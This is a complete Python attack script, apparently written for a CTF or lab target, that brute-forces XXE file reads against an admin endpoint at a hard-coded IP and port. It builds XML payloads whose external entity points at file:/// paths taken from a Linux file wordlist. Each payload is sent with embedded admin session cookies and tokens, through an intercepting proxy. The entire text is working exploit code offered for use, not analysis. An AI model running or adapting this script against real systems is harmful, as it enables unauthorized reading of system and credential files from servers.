import requests
import time
import concurrent.futures
from urllib.parse import quote_plus
from urllib3.exceptions import InsecureRequestWarning
from tqdm import tqdm

# --- CONFIGURATION ---
TARGET_URL = "http://34.100.175.35:30302/admin/events/update/1/xml"
WORDLIST_PATH = "/usr/share/seclists/Discovery/Web-Content/LinuxFileList.txt"
PROXY = "http://127.0.0.1:8080"
BATCH_SIZE = 100      
BATCH_DELAY = 30
TIMEOUT = 20        
IGNORE_SIZES = [215] # Add response lengths you want to hide from console

# Update with your active session cookies
COOKIES = {
    "access_token_cookie": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJub3RhdHlwaWNhbHN5c2FkbWluJy0tIiwicm9sZSI6ImFkbWluIn0.E7jl5jFJirxqjYRBaOO6XjUIFwd_xBZgeJxj0PdtgGc",
    "session": ".eJwNyDsOgCAMANC7dHZQPgpchrTQhkSDBkgcjHfXN74HojTuBYLg0XmChNdIBSPWfnODAErBv71JHOfO9Z-Z7MIriWBy2pDdHGFardEuo0fniVUmnxneD8m9HhU.adfJ_A.se0lmc4ssRNhLzCuoW9HU0Prbz4",
    "remember_token": "999999|ae5c6439f4b9a8727427fc33a4b73f963b5717c47212200560b3b6d5ce903566e98cbaffab5eeb6a1d27cf18187eaf9c7a43533585d5f17dcf9278d7d91dd2"
}

# Disable SSL warnings for proxying to ZAP/Burp
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
proxies = {"http": PROXY, "https": PROXY}

def load_wordlist(path):
    """Loads and filters the wordlist."""
    try:
        with open(path, 'r') as f:
            return [line.strip() for line in f]
    except FileNotFoundError:
        print(f"[!] Error: Wordlist not found at {path}")
        return []

def send_payload(file_path):
    """Constructs URL-encoded XXE payload and sends as form data."""
    full_path = f"/{file_path}" if not file_path.startswith("/") else file_path
    
    xml_content = (
        f'<?xml version="1.0" encoding="UTF-8"?>'
        f'<!DOCTYPE event [<!ENTITY xxe SYSTEM "file:///{full_path}">]>'
        f'<event>'
        f'<title>&xxe;</title>'
        f'<description>Super Fun Event</description>'
        f'<happening_at>2051-12-31 10:00</happening_at>'
        f'<visibility>user</visibility>'
        f'</event>'
    )
    
    encoded_xml = quote_plus(xml_content)
    body = f"xml_data={encoded_xml}"
    
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer": "http://34.100.175.35:30302/admin/events/update/1"
    }
    
    try:
        response = requests.post(
            TARGET_URL, 
            data=body, 
            headers=headers, 
            cookies=COOKIES,
            proxies=proxies, 
            verify=False, 
            timeout=TIMEOUT
        )
        return file_path, response.status_code, len(response.text)
    except Exception as e:
        return file_path, "ERROR", str(e)

def main():
    wordlist = load_wordlist(WORDLIST_PATH)
    if not wordlist:
        return

    print(f"[*] Loaded {len(wordlist)} paths from {WORDLIST_PATH}")
    print(f"[*] Targeting: {TARGET_URL}")
    print(f"[*] Proxying through: {PROXY}\n")

    pbar = tqdm(total=len(wordlist), desc="Overall Progress", unit="file")

    for i in range(0, len(wordlist), BATCH_SIZE):
        batch = wordlist[i : i + BATCH_SIZE]

        with concurrent.futures.ThreadPoolExecutor(max_workers=BATCH_SIZE) as executor:
            futures = [executor.submit(send_payload, path) for path in batch]
            
            for future in concurrent.futures.as_completed(futures):
                path, status, length = future.result()
                
                # Only print if size is not in the ignore list
                if length not in IGNORE_SIZES:
                    # tqdm.write prevents the bar from breaking when printing
                    tqdm.write(f"    [{status}] {path} - Size: {length}")
                
                pbar.update(1)

        if i + BATCH_SIZE < len(wordlist):
            time.sleep(BATCH_DELAY)
            
    pbar.close()
    print("\n[+] Fuzzing complete. Check ZAP for response details.")

if __name__ == "__main__":
    main()